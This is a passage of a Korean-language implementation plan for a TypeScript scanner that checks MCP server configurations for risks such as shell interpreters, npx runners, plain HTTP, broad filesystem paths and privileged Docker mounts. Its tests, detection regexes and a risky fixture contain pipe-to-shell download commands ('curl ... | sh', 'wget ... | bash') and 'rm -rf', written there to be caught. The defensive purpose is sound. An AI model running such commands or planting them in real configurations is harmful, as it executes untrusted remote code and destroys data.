    expect(f).toHaveLength(1);
  });

  it('flags POSIX absolute path /usr/bin/bash', () => {
    const f = shellExecutionRule.run(server('/usr/bin/bash'));
    expect(f).toHaveLength(1);
  });

  it('mentions -c flag in message when present', () => {
    const f = shellExecutionRule.run(server('bash', ['-c', 'echo hi']));
    expect(f[0]!.message).toContain('-c');
  });

  it('mentions /c flag for cmd', () => {
    const f = shellExecutionRule.run(server('cmd', ['/c', 'dir']));
    expect(f[0]!.message).toContain('/c');
  });

  it('does not flag node', () => {
    expect(shellExecutionRule.run(server('node'))).toEqual([]);
  });

  it('does not flag when command absent', () => {
    expect(shellExecutionRule.run(server(undefined))).toEqual([]);
  });
});
```

- [ ] **Step 10.2: 테스트 실패 확인**

```
pnpm test rules.shellExecution
```

Expected: FAIL.

- [ ] **Step 10.3: 구현 — `src/scanner/rules/shellExecution.ts`**

```ts
import type { Finding, McpServerConfig, Rule } from '../../types.js';
import { commandBasename } from '../../utils/command.js';

const SHELLS = new Set(['bash', 'sh', 'zsh', 'fish', 'dash', 'ksh', 'cmd', 'powershell', 'pwsh']);
const EVAL_FLAGS = new Set(['-c', '/c', '-e', '--eval', '--command']);

export const shellExecutionRule: Rule = {
  id: 'MCPG002',
  run(server: McpServerConfig): Finding[] {
    if (!server.command) return [];
    const basename = commandBasename(server.command);
    if (!SHELLS.has(basename)) return [];
    const flags = (server.args ?? []).filter((a) => EVAL_FLAGS.has(a));
    const flagSuffix = flags.length > 0 ? ` (with eval flag: ${flags.join(', ')})` : '';
    return [
      {
        ruleId: 'MCPG002',
        severity: 'high',
        server: server.name,
        title: 'Shell execution command',
        message: `Server uses a shell interpreter (${basename}) as its command${flagSuffix}.`,
        recommendation:
          'Prefer invoking a specific binary directly. Shell commands can execute arbitrary code provided in args.',
        path: `mcpServers.${server.name}.command`,
      },
    ];
  },
};
```

- [ ] **Step 10.4: 테스트 통과 확인**

```
pnpm test rules.shellExecution
```

Expected: 모든 테스트 PASS.

- [ ] **Step 10.5: 커밋**

```
git add src/scanner/rules/shellExecution.ts test/rules.shellExecution.test.ts
git commit -m "feat(rules): add MCPG002 shell-execution-command detection"
```

---

## Task 11: 룰 MCPG003 — dynamicRunner

**Files:**
- Create: `src/scanner/rules/dynamicRunner.ts`
- Test: `test/rules.dynamicRunner.test.ts`

- [ ] **Step 11.1: 실패하는 테스트 작성 — `test/rules.dynamicRunner.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { dynamicRunnerRule } from '../src/scanner/rules/dynamicRunner.js';
import type { McpServerConfig } from '../src/types.js';

const server = (command?: string, args?: string[]): McpServerConfig => ({
  name: 's',
  command,
  args,
  raw: { command, args },
});

describe('dynamicRunnerRule (MCPG003)', () => {
  it.each(['npx', 'pnpx', 'bunx', 'uvx'])('flags %s', (c) => {
    const f = dynamicRunnerRule.run(server(c, ['-y', 'pkg']));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('medium');
    expect(f[0]!.ruleId).toBe('MCPG003');
  });

  it('flags yarn dlx', () => {
    expect(dynamicRunnerRule.run(server('yarn', ['dlx', 'pkg']))).toHaveLength(1);
  });

  it('flags pnpm dlx', () => {
    expect(dynamicRunnerRule.run(server('pnpm', ['dlx', 'pkg']))).toHaveLength(1);
  });

  it('flags pnpm dlx even when other args precede', () => {
    expect(dynamicRunnerRule.run(server('pnpm', ['--silent', 'dlx', 'pkg']))).toHaveLength(1);
  });

  it('does not flag yarn install', () => {
    expect(dynamicRunnerRule.run(server('yarn', ['install']))).toEqual([]);
  });

  it('does not flag node', () => {
    expect(dynamicRunnerRule.run(server('node', ['./server.js']))).toEqual([]);
  });

  it('does not flag when command absent', () => {
    expect(dynamicRunnerRule.run(server(undefined))).toEqual([]);
  });
});
```

- [ ] **Step 11.2: 테스트 실패 확인**

```
pnpm test rules.dynamicRunner
```

Expected: FAIL.

- [ ] **Step 11.3: 구현 — `src/scanner/rules/dynamicRunner.ts`**

```ts
import type { Finding, McpServerConfig, Rule } from '../../types.js';
import { commandBasename } from '../../utils/command.js';

const DIRECT = new Set(['npx', 'pnpx', 'bunx', 'uvx']);
const DLX_HOSTS = new Set(['yarn', 'pnpm']);

export const dynamicRunnerRule: Rule = {
  id: 'MCPG003',
  run(server: McpServerConfig): Finding[] {
    if (!server.command) return [];
    const basename = commandBasename(server.command);
    const triggered =
      DIRECT.has(basename) ||
      (DLX_HOSTS.has(basename) && (server.args ?? []).includes('dlx'));
    if (!triggered) return [];
    return [
      {
        ruleId: 'MCPG003',
        severity: 'medium',
        server: server.name,
        title: 'Dynamic package runner',
        message: `Server uses a dynamic package runner (${basename}). Packages may be fetched and executed at runtime.`,
        recommendation:
          'Pin the exact package version or pre-install the dependency. Verify package provenance.',
        path: `mcpServers.${server.name}.command`,
      },
    ];
  },
};
```

- [ ] **Step 11.4: 테스트 통과 확인**

```
pnpm test rules.dynamicRunner
```

Expected: 모든 테스트 PASS.

- [ ] **Step 11.5: 커밋**

```
git add src/scanner/rules/dynamicRunner.ts test/rules.dynamicRunner.test.ts
git commit -m "feat(rules): add MCPG003 dynamic-package-runner detection"
```

---

## Task 12: 룰 MCPG004 + MCPG008 — httpTransport

**Files:**
- Create: `src/scanner/rules/httpTransport.ts`
- Test: `test/rules.httpTransport.test.ts`

- [ ] **Step 12.1: 실패하는 테스트 작성 — `test/rules.httpTransport.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import {
  plainHttpRule,
  publicRemoteEndpointRule,
} from '../src/scanner/rules/httpTransport.js';
import type { McpServerConfig } from '../src/types.js';

const server = (url?: string): McpServerConfig => ({ name: 's', url, raw: { url } });

describe('plainHttpRule (MCPG004)', () => {
  it('flags http://localhost as medium', () => {
    const f = plainHttpRule.run(server('http://localhost:3000/sse'));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('medium');
    expect(f[0]!.ruleId).toBe('MCPG004');
  });

  it('flags http://example.com as medium', () => {
    expect(plainHttpRule.run(server('http://example.com'))[0]!.severity).toBe('medium');
  });

  it('does not flag https://', () => {
    expect(plainHttpRule.run(server('https://example.com'))).toEqual([]);
  });

  it('does not flag when url absent', () => {
    expect(plainHttpRule.run(server(undefined))).toEqual([]);
  });
});

describe('publicRemoteEndpointRule (MCPG008)', () => {
  it('flags https://example.com as low', () => {
    const f = publicRemoteEndpointRule.run(server('https://api.example.com'));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('low');
    expect(f[0]!.ruleId).toBe('MCPG008');
  });

  it('does not flag https://localhost', () => {
    expect(publicRemoteEndpointRule.run(server('https://localhost:3000'))).toEqual([]);
  });

  it('does not flag https://127.0.0.1', () => {
    expect(publicRemoteEndpointRule.run(server('https://127.0.0.1:3000'))).toEqual([]);
  });

  it('does not flag https://10.0.0.5 (RFC1918)', () => {
    expect(publicRemoteEndpointRule.run(server('https://10.0.0.5:3000'))).toEqual([]);
  });

  it('does not flag https://192.168.1.5', () => {
    expect(publicRemoteEndpointRule.run(server('https://192.168.1.5'))).toEqual([]);
  });

  it('does not flag http URL (covered by MCPG004)', () => {
    expect(publicRemoteEndpointRule.run(server('http://example.com'))).toEqual([]);
  });

  it('does not flag invalid URL', () => {
    expect(publicRemoteEndpointRule.run(server('not-a-url'))).toEqual([]);
  });
});
```

- [ ] **Step 12.2: 테스트 실패 확인**

```
pnpm test rules.httpTransport
```

Expected: FAIL.

- [ ] **Step 12.3: 구현 — `src/scanner/rules/httpTransport.ts`**

```ts
import type { Finding, McpServerConfig, Rule } from '../../types.js';

function parseUrl(input: string | undefined): URL | null {
  if (!input) return null;
  try {
    return new URL(input);
  } catch {
    return null;
  }
}

function isLoopback(host: string): boolean {
  const h = host.toLowerCase();
  return h === 'localhost' || h === '127.0.0.1' || h === '[::1]' || h === '::1';
}

function isPrivateIPv4(host: string): boolean {
  const m = host.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
  if (!m) return false;
  const [a, b] = [Number(m[1]), Number(m[2])];
  if (a === 10) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 192 && b === 168) return true;
  if (a === 169 && b === 254) return true;
  return false;
}

export const plainHttpRule: Rule = {
  id: 'MCPG004',
  run(server: McpServerConfig): Finding[] {
    if (!server.url || !server.url.startsWith('http://')) return [];
    return [
      {
        ruleId: 'MCPG004',
        severity: 'medium',
        server: server.name,
        title: 'Plain HTTP transport',
        message: `Server URL uses plain HTTP: ${server.url}`,
        recommendation: 'Prefer authenticated HTTPS or a trusted local-only transport.',
        path: `mcpServers.${server.name}.url`,
      },
    ];
  },
};

export const publicRemoteEndpointRule: Rule = {
  id: 'MCPG008',
  run(server: McpServerConfig): Finding[] {
    if (!server.url || !server.url.startsWith('https://')) return [];
    const url = parseUrl(server.url);
    if (!url) return [];
    if (isLoopback(url.hostname) || isPrivateIPv4(url.hostname)) return [];
    return [
      {
        ruleId: 'MCPG008',
        severity: 'low',
        server: server.name,
        title: 'Public remote endpoint',
        message: `Server connects to a public remote endpoint: ${url.origin}`,
        recommendation:
          'Confirm the endpoint is trusted and uses authenticated TLS. Be aware that data may leave your environment.',
        path: `mcpServers.${server.name}.url`,
      },
    ];
  },
};
```

- [ ] **Step 12.4: 테스트 통과 확인**

```
pnpm test rules.httpTransport
```

Expected: 모든 테스트 PASS.

- [ ] **Step 12.5: 커밋**

```
git add src/scanner/rules/httpTransport.ts test/rules.httpTransport.test.ts
git commit -m "feat(rules): add MCPG004 plain-HTTP and MCPG008 public-remote-endpoint detection"
```

---

## Task 13: 룰 MCPG005 — filesystemAccess

**Files:**
- Create: `src/scanner/rules/filesystemAccess.ts`
- Test: `test/rules.filesystemAccess.test.ts`

- [ ] **Step 13.1: 실패하는 테스트 작성 — `test/rules.filesystemAccess.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { filesystemAccessRule } from '../src/scanner/rules/filesystemAccess.js';
import type { McpServerConfig } from '../src/types.js';

const server = (command?: string, args?: string[]): McpServerConfig => ({
  name: 's',
  command,
  args,
  raw: { command, args },
});

describe('filesystemAccessRule (MCPG005)', () => {
  it('flags / root', () => {
    const f = filesystemAccessRule.run(server('node', ['./srv.js', '/']));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
  });

  it('flags ~ home', () => {
    expect(filesystemAccessRule.run(server('node', ['./srv.js', '~']))).toHaveLength(1);
  });

  it('flags /Users/alice (home)', () => {
    expect(filesystemAccessRule.run(server('node', ['./srv.js', '/Users/alice']))).toHaveLength(1);
  });

  it('flags C:\\Users\\alice', () => {
    expect(filesystemAccessRule.run(server('node', ['./srv.js', 'C:\\Users\\alice']))).toHaveLength(1);
  });

  it('flags parent traversal ..', () => {
    expect(filesystemAccessRule.run(server('node', ['./srv.js', '../..']))).toHaveLength(1);
  });

  it('does not flag narrow subpath /Users/alice/project/docs', () => {
    expect(filesystemAccessRule.run(server('node', ['./srv.js', '/Users/alice/project/docs']))).toEqual(
      []
    );
  });

  it('mentions filesystem server in message when @modelcontextprotocol/server-filesystem present', () => {
    const f = filesystemAccessRule.run(
      server('npx', ['-y', '@modelcontextprotocol/server-filesystem', '/Users/alice'])
    );
    expect(f[0]!.message.toLowerCase()).toContain('filesystem');
  });

  it('does not flag when no args', () => {
    expect(filesystemAccessRule.run(server('node'))).toEqual([]);
  });
});
```

- [ ] **Step 13.2: 테스트 실패 확인**

```
pnpm test rules.filesystemAccess
```

Expected: FAIL.

- [ ] **Step 13.3: 구현 — `src/scanner/rules/filesystemAccess.ts`**

```ts
import type { Finding, McpServerConfig, Rule } from '../../types.js';
import { isBroadPath, isParentTraversal } from '../../utils/paths.js';

const FS_SERVER_HINT = '@modelcontextprotocol/server-filesystem';

export const filesystemAccessRule: Rule = {
  id: 'MCPG005',
  run(server: McpServerConfig): Finding[] {
    const args = server.args ?? [];
    const flagged = args.find((a) => isBroadPath(a) || isParentTraversal(a));
    if (!flagged) return [];

    const usesFsServer =
      args.some((a) => a.includes(FS_SERVER_HINT)) ||
      (server.command?.includes(FS_SERVER_HINT) ?? false);
    const fsHint = usesFsServer
      ? ' This server appears to be the MCP filesystem server, which exposes the path directly.'
      : '';

    return [
      {
        ruleId: 'MCPG005',
        severity: 'high',
        server: server.name,
        title: 'Broad filesystem access',
        message: `Argument appears to grant broad file access: ${flagged}.${fsHint}`,
        recommendation: 'Restrict access to a project-specific directory.',
        path: `mcpServers.${server.name}.args`,
      },
    ];
  },
};
```

- [ ] **Step 13.4: 테스트 통과 확인**

```
pnpm test rules.filesystemAccess
```

Expected: 모든 테스트 PASS.

- [ ] **Step 13.5: 커밋**

```
git add src/scanner/rules/filesystemAccess.ts test/rules.filesystemAccess.test.ts
git commit -m "feat(rules): add MCPG005 broad-filesystem-access detection"
```

---

## Task 14: 룰 MCPG006 — dockerRisk

**Files:**
- Create: `src/scanner/rules/dockerRisk.ts`
- Test: `test/rules.dockerRisk.test.ts`

- [ ] **Step 14.1: 실패하는 테스트 작성 — `test/rules.dockerRisk.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { dockerRiskRule } from '../src/scanner/rules/dockerRisk.js';
import type { McpServerConfig } from '../src/types.js';

const server = (command?: string, args?: string[]): McpServerConfig => ({
  name: 's',
  command,
  args,
  raw: { command, args },
});

describe('dockerRiskRule (MCPG006)', () => {
  it('flags --privileged', () => {
    const f = dockerRiskRule.run(server('docker', ['run', '--privileged', 'image']));
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('high');
    expect(f[0]!.ruleId).toBe('MCPG006');
  });

  it('flags -v with docker.sock mount', () => {
    expect(
      dockerRiskRule.run(server('docker', ['run', '-v', '/var/run/docker.sock:/var/run/docker.sock', 'img']))
    ).toHaveLength(1);
  });

  it('flags -v with root mount', () => {
    expect(dockerRiskRule.run(server('docker', ['run', '-v', '/:/host', 'img']))).toHaveLength(1);
  });

  it('flags --mount with docker.sock source', () => {
    expect(
      dockerRiskRule.run(
        server('docker', ['run', '--mount', 'type=bind,source=/var/run/docker.sock,target=/sock', 'img'])
      )
    ).toHaveLength(1);
  });

  it('flags --mount with root source', () => {
    expect(
      dockerRiskRule.run(server('docker', ['run', '--mount', 'type=bind,source=/,target=/host', 'img']))
    ).toHaveLength(1);
  });

  it('flags podman --privileged', () => {
    expect(dockerRiskRule.run(server('podman', ['run', '--privileged', 'img']))).toHaveLength(1);
  });

  it('does not flag normal docker run', () => {
    expect(dockerRiskRule.run(server('docker', ['run', '-v', './data:/data', 'img']))).toEqual([]);
  });

  it('does not flag non-docker command', () => {
    expect(dockerRiskRule.run(server('node', ['./srv.js']))).toEqual([]);
  });
});
```

- [ ] **Step 14.2: 테스트 실패 확인**

```
pnpm test rules.dockerRisk
```

Expected: FAIL.

- [ ] **Step 14.3: 구현 — `src/scanner/rules/dockerRisk.ts`**

```ts
import type { Finding, McpServerConfig, Rule } from '../../types.js';
import { commandBasename } from '../../utils/command.js';

const RUNTIMES = new Set(['docker', 'podman']);

function findIssues(args: string[]): string[] {
  const issues: string[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!;
    if (a === '--privileged') {
      issues.push('--privileged flag');
      continue;
    }
    if (a === '-v' || a === '--volume') {
      const next = args[i + 1] ?? '';
      if (next.includes('docker.sock')) issues.push('Docker socket mount via -v');
      else if (next.startsWith('/:') || next.startsWith('/:/')) issues.push('Host root mount via -v');
    }
    if (a === '--mount') {
      const next = args[i + 1] ?? '';
      if (next.includes('source=/var/run/docker.sock')) issues.push('Docker socket mount via --mount');
      else if (/(^|,)source=\//.test(next) && !/(^|,)source=\.\//.test(next)) {
        // crude: source=/ but not source=./
        if (/(^|,)source=\/(,|$)/.test(next)) issues.push('Host root mount via --mount');
      }
    }
  }
  return issues;
}

export const dockerRiskRule: Rule = {
  id: 'MCPG006',
  run(server: McpServerConfig): Finding[] {
    if (!server.command) return [];
    const basename = commandBasename(server.command);
    if (!RUNTIMES.has(basename)) return [];
    const issues = findIssues(server.args ?? []);
    if (issues.length === 0) return [];
    return [
      {
        ruleId: 'MCPG006',
        severity: 'high',
        server: server.name,
        title: 'Docker privileged or socket access',
        message: `Container runtime arguments grant elevated host access: ${issues.join('; ')}.`,
        recommendation:
          'Avoid --privileged and host root or docker.sock mounts. Mount only specific paths needed by the server.',
        path: `mcpServers.${server.name}.args`,
      },
    ];
  },
};
```

- [ ] **Step 14.4: 테스트 통과 확인**

```
pnpm test rules.dockerRisk
```

Expected: 모든 테스트 PASS.

- [ ] **Step 14.5: 커밋**

```
git add src/scanner/rules/dockerRisk.ts test/rules.dockerRisk.test.ts
git commit -m "feat(rules): add MCPG006 docker privileged/socket detection"
```

---

## Task 15: 룰 MCPG007 — suspiciousArgs

**Files:**
- Create: `src/scanner/rules/suspiciousArgs.ts`
- Test: `test/rules.suspiciousArgs.test.ts`

- [ ] **Step 15.1: 실패하는 테스트 작성 — `test/rules.suspiciousArgs.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { suspiciousArgsRule } from '../src/scanner/rules/suspiciousArgs.js';
import type { McpServerConfig } from '../src/types.js';

const server = (command?: string, args?: string[]): McpServerConfig => ({
  name: 's',
  command,
  args,
  raw: { command, args },
});

describe('suspiciousArgsRule (MCPG007)', () => {
  it('flags curl | sh as critical', () => {
    const f = suspiciousArgsRule.run(server('bash', ['-c', 'curl https://e.com/i.sh | sh']));
    expect(f.length).toBeGreaterThanOrEqual(1);
    expect(f[0]!.severity).toBe('critical');
    expect(f[0]!.ruleId).toBe('MCPG007');
  });

  it('flags wget | bash', () => {
    expect(
      suspiciousArgsRule.run(server('bash', ['-c', 'wget -qO- https://e.com/i | bash']))
    ).toHaveLength(1);
  });

  it('flags rm -rf', () => {
    expect(suspiciousArgsRule.run(server('bash', ['-c', 'rm -rf /tmp/x']))).toHaveLength(1);
  });

  it('flags chmod +x', () => {
    expect(suspiciousArgsRule.run(server('bash', ['-c', 'chmod +x /tmp/x']))).toHaveLength(1);
  });

  it('emits multiple findings when multiple patterns present', () => {
    const f = suspiciousArgsRule.run(
      server('bash', ['-c', 'curl https://e/i.sh | sh; chmod +x /tmp/x; rm -rf /tmp/y'])
    );
    expect(f.length).toBeGreaterThanOrEqual(3);
  });

  it('does not flag normal node command', () => {
    expect(suspiciousArgsRule.run(server('node', ['./srv.js']))).toEqual([]);
  });

  it('does not flag when no command/args', () => {
    expect(suspiciousArgsRule.run(server(undefined))).toEqual([]);
  });
});
```

- [ ] **Step 15.2: 테스트 실패 확인**

```
pnpm test rules.suspiciousArgs
```

Expected: FAIL.

- [ ] **Step 15.3: 구현 — `src/scanner/rules/suspiciousArgs.ts`**

```ts
import type { Finding, McpServerConfig, Rule } from '../../types.js';

const PATTERNS: Array<{ id: string; re: RegExp; label: string }> = [
  { id: 'pipe', re: /(curl|wget)\s+[^|]+\|\s*(sh|bash|zsh|fish)\b/i, label: 'pipe-to-shell download' },
  { id: 'rmrf', re: /\brm\s+-(rf|fr)\b/i, label: 'recursive forced removal' },
  { id: 'chmodx', re: /\bchmod\s+\+x\b/i, label: 'chmod +x' },
];

export const suspiciousArgsRule: Rule = {
  id: 'MCPG007',
  run(server: McpServerConfig): Finding[] {
    if (!server.command && (!server.args || server.args.length === 0)) return [];
    const haystack = [server.command ?? '', ...(server.args ?? [])].join(' ');
    const out: Finding[] = [];
    for (const p of PATTERNS) {
      if (p.re.test(haystack)) {
        out.push({
          ruleId: 'MCPG007',
          severity: 'critical',
          server: server.name,
          title: 'Suspicious shell pipeline or download',
          message: `Detected pattern: ${p.label}.`,
          recommendation:
            'Inspect the command carefully. Piping a remote download into a shell or recursive deletion can have severe consequences.',
          path: `mcpServers.${server.name}.args`,
          metadata: { pattern: p.id },
        });
      }
    }
    return out;
  },
};
```

- [ ] **Step 15.4: 테스트 통과 확인**

```
pnpm test rules.suspiciousArgs
```

Expected: 모든 테스트 PASS.

- [ ] **Step 15.5: 커밋**

```
git add src/scanner/rules/suspiciousArgs.ts test/rules.suspiciousArgs.test.ts
git commit -m "feat(rules): add MCPG007 suspicious-shell-pipeline detection"
```

---

## Task 16: 룰 MCPG009 — missingCommand

**Files:**
- Create: `src/scanner/rules/missingCommand.ts`
- Test: `test/rules.missingCommand.test.ts`

- [ ] **Step 16.1: 실패하는 테스트 작성 — `test/rules.missingCommand.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { missingCommandRule } from '../src/scanner/rules/missingCommand.js';
import type { McpServerConfig } from '../src/types.js';

const server = (overrides: Partial<McpServerConfig> = {}): McpServerConfig => ({
  name: 's',
  raw: {},
  ...overrides,
});

describe('missingCommandRule (MCPG009)', () => {
  it('flags when neither command nor url present', () => {
    const f = missingCommandRule.run(server());
    expect(f).toHaveLength(1);
    expect(f[0]!.severity).toBe('info');
    expect(f[0]!.ruleId).toBe('MCPG009');
  });

  it('does not flag when command present', () => {
    expect(missingCommandRule.run(server({ command: 'node' }))).toEqual([]);
  });

  it('does not flag when url present', () => {
    expect(missingCommandRule.run(server({ url: 'https://x' }))).toEqual([]);
  });
});
```

- [ ] **Step 16.2: 테스트 실패 확인**

```
pnpm test rules.missingCommand
```

Expected: FAIL.

- [ ] **Step 16.3: 구현 — `src/scanner/rules/missingCommand.ts`**

```ts
import type { Finding, McpServerConfig, Rule } from '../../types.js';

export const missingCommandRule: Rule = {
  id: 'MCPG009',
  run(server: McpServerConfig): Finding[] {
    if (typeof server.command === 'string' || typeof server.url === 'string') return [];
    return [
      {
        ruleId: 'MCPG009',
        severity: 'info',
        server: server.name,
        title: 'Missing command or url',
        message: 'Server entry has neither a string `command` nor a string `url`.',
        recommendation: 'Verify the entry is intentional. The server cannot be launched without one of these.',
        path: `mcpServers.${server.name}`,
      },
    ];
  },
};
```

- [ ] **Step 16.4: 테스트 통과 확인**

```
pnpm test rules.missingCommand
```

Expected: 모든 테스트 PASS.

- [ ] **Step 16.5: 커밋**

```
git add src/scanner/rules/missingCommand.ts test/rules.missingCommand.test.ts
git commit -m "feat(rules): add MCPG009 missing-command-or-url detection"
```

---

## Task 17: 룰 레지스트리

**Files:**
- Create: `src/scanner/rules/index.ts`

- [ ] **Step 17.1: 작성 — `src/scanner/rules/index.ts`**

```ts
import type { Rule } from '../../types.js';
import { secretsRule } from './secrets.js';
import { shellExecutionRule } from './shellExecution.js';
import { dynamicRunnerRule } from './dynamicRunner.js';
import { plainHttpRule, publicRemoteEndpointRule } from './httpTransport.js';
import { filesystemAccessRule } from './filesystemAccess.js';
import { dockerRiskRule } from './dockerRisk.js';
import { suspiciousArgsRule } from './suspiciousArgs.js';
import { missingCommandRule } from './missingCommand.js';

export const defaultRules: Rule[] = [
  secretsRule,
  shellExecutionRule,
  dynamicRunnerRule,
  plainHttpRule,
  publicRemoteEndpointRule,
  filesystemAccessRule,
  dockerRiskRule,
  suspiciousArgsRule,
  missingCommandRule,
];
```

- [ ] **Step 17.2: typecheck**

```
pnpm typecheck
```

Expected: 에러 없음.

- [ ] **Step 17.3: 커밋**

```
git add src/scanner/rules/index.ts
git commit -m "feat(rules): export defaultRules registry"
```

---

## Task 18: scanServer + scan

**Files:**
- Create: `src/scanner/scan.ts`
- Create: `src/index.ts`
- Create: `test/fixtures/safe.json`
- Create: `test/fixtures/risky.json`
- Test: `test/scan.test.ts`

- [ ] **Step 18.1: fixture 생성 — `test/fixtures/safe.json`**

```json
{
  "mcpServers": {
    "project-docs": {
      "command": "node",
      "args": ["./dist/server.js", "./docs"]
    }
  }
}
```

- [ ] **Step 18.2: fixture 생성 — `test/fixtures/risky.json`**

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/alice"],
      "env": {
        "GITHUB_TOKEN": "ghp_should_not_be_printed"
      }
    },
    "shell": {
      "command": "bash",
      "args": ["-c", "curl https://example.com/install.sh | sh"]
    },
    "remote": {
      "url": "http://localhost:3000/sse"
    }
  }
}
```

- [ ] **Step 18.3: 실패하는 테스트 작성 — `test/scan.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import path from 'node:path';
import { scan } from '../src/scanner/scan.js';

const fixture = (n: string) => path.resolve('test/fixtures', n);

describe('scan', () => {
  it('safe.json: low/no high+ findings', async () => {
    const result = await scan(fixture('safe.json'));
    expect(result.summary.serversScanned).toBe(1);
    const high = result.findings.filter((f) => f.severity === 'high' || f.severity === 'critical');
    expect(high).toHaveLength(0);
  });

  it('risky.json: triggers MCPG001/002/003/004/005/007', async () => {
    const result = await scan(fixture('risky.json'));
    const ids = new Set(result.findings.map((f) => f.ruleId));
    for (const id of ['MCPG001', 'MCPG002', 'MCPG003', 'MCPG004', 'MCPG005', 'MCPG007']) {
      expect(ids.has(id), `expected ${id} in findings`).toBe(true);
    }
  });

  it('risky.json: summary risk is critical', async () => {
    const result = await scan(fixture('risky.json'));
    expect(result.summary.risk).toBe('critical');
  });

  it('risky.json: secret value never appears in any finding', async () => {
    const result = await scan(fixture('risky.json'));
    const blob = JSON.stringify(result);
    expect(blob).not.toContain('ghp_should_not_be_printed');
  });

  it('schemaVersion is "1"', async () => {
    const result = await scan(fixture('safe.json'));
    expect(result.schemaVersion).toBe('1');
  });
});
```

- [ ] **Step 18.4: 테스트 실패 확인**

```
pnpm test scan.test
```

Expected: FAIL.

- [ ] **Step 18.5: 구현 — `src/scanner/scan.ts`**

```ts
import path from 'node:path';
import { loadConfig } from '../config/loadConfig.js';
import { normalizeServers } from '../config/normalizeServers.js';
import { defaultRules } from './rules/index.js';
import { maxSeverity } from './severity.js';
import type { Finding, McpServerConfig, Rule, ScanResult } from '../types.js';

export function scanServer(server: McpServerConfig, rules: Rule[] = defaultRules): Finding[] {
  const out: Finding[] = [];
  for (const r of rules) {
    out.push(...r.run(server));
  }
  return out;
}

export interface ScanOptions {
  rules?: Rule[];
  onWarn?: (message: string) => void;
}

export async function scan(target: string, options: ScanOptions = {}): Promise<ScanResult> {
  const rules = options.rules ?? defaultRules;
  const raw = await loadConfig(target);
  const servers = normalizeServers(raw, { onWarn: options.onWarn });
  const findings: Finding[] = [];
  for (const s of servers) {
    findings.push(...scanServer(s, rules));
  }
  return {
    schemaVersion: '1',
    target: path.resolve(target),
    summary: {
      risk: maxSeverity(findings.map((f) => f.severity)),
      serversScanned: servers.length,
      findings: findings.length,
    },
    findings,
  };
}
```

- [ ] **Step 18.6: `src/index.ts` 작성**

```ts
export type {
  Severity,
  McpServerConfig,
  Finding,
  ScanResult,
  Rule,
} from './types.js';
export { LoadError } from './types.js';
export { scan, scanServer, type ScanOptions } from './scanner/scan.js';
export { defaultRules } from './scanner/rules/index.js';
```

- [ ] **Step 18.7: 테스트 통과 확인**

```
pnpm test scan.test
```

Expected: 모든 테스트 PASS.

- [ ] **Step 18.8: 커밋**

```
git add src/scanner/scan.ts src/index.ts test/scan.test.ts test/fixtures/safe.json test/fixtures/risky.json
git commit -m "feat(scanner): add scanServer + scan with default rules; library exports"
```

---

## Task 19: JSON reporter

**Files:**
- Create: `src/reporters/jsonReporter.ts`
- Test: `test/reporter.json.test.ts`

- [ ] **Step 19.1: 실패하는 테스트 작성 — `test/reporter.json.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { renderJson } from '../src/reporters/jsonReporter.js';
import type { ScanResult } from '../src/types.js';

const sampleResult = (): ScanResult => ({
  schemaVersion: '1',
  target: '/Users/alice/mcp.json',
  summary: { risk: 'high', serversScanned: 1, findings: 1 },
  findings: [
    {
      ruleId: 'MCPG005',
      severity: 'high',
      server: 'fs',
      title: 'Broad filesystem access',
      message: 'Argument appears to grant broad file access: /Users/alice.',
      recommendation: 'Restrict access to a project-specific directory.',
      path: 'mcpServers.fs.args',
    },
  ],
});

describe('renderJson', () => {
  it('produces valid JSON', () => {
    const out = renderJson(sampleResult(), { home: '/Users/alice' });
    expect(() => JSON.parse(out)).not.toThrow();
  });

  it('includes schemaVersion=1', () => {
    const parsed = JSON.parse(renderJson(sampleResult(), { home: '/Users/alice' }));
    expect(parsed.schemaVersion).toBe('1');
  });

  it('redacts home path in target', () => {
    const parsed = JSON.parse(renderJson(sampleResult(), { home: '/Users/alice' }));
    expect(parsed.target).toBe('~/mcp.json');
  });

  it('redacts home path in finding messages', () => {
    const parsed = JSON.parse(renderJson(sampleResult(), { home: '/Users/alice' }));
    expect(parsed.findings[0].message).toContain('~');
    expect(parsed.findings[0].message).not.toContain('/Users/alice');
  });
});
```

- [ ] **Step 19.2: 테스트 실패 확인**

```
pnpm test reporter.json
```

Expected: FAIL.

- [ ] **Step 19.3: 구현 — `src/reporters/jsonReporter.ts`**

```ts
import os from 'node:os';
import { redactHome } from '../utils/redact.js';
import type { Finding, ScanResult } from '../types.js';

export interface JsonReporterOptions {
  home?: string;
}

function redactFinding(f: Finding, home: string): Finding {
  return {
    ...f,
    message: redactHome(f.message, home),
    recommendation: f.recommendation ? redactHome(f.recommendation, home) : f.recommendation,
    path: f.path ? redactHome(f.path, home) : f.path,
  };
}

export function renderJson(result: ScanResult, opts: JsonReporterOptions = {}): string {
  const home = opts.home ?? os.homedir();
  const redacted: ScanResult = {
    ...result,
    target: redactHome(result.target, home),
    findings: result.findings.map((f) => redactFinding(f, home)),
  };
  return JSON.stringify(redacted, null, 2);
}
```

- [ ] **Step 19.4: 테스트 통과 확인**

```
pnpm test reporter.json
```

Expected: 모든 테스트 PASS.

- [ ] **Step 19.5: 커밋**

```
git add src/reporters/jsonReporter.ts test/reporter.json.test.ts
git commit -m "feat(reporter): add JSON reporter with home-path redaction"
```

---

## Task 20: Text reporter

**Files:**
- Create: `src/reporters/textReporter.ts`
- Test: `test/reporter.text.test.ts`

- [ ] **Step 20.1: 실패하는 테스트 작성 — `test/reporter.text.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { renderText } from '../src/reporters/textReporter.js';
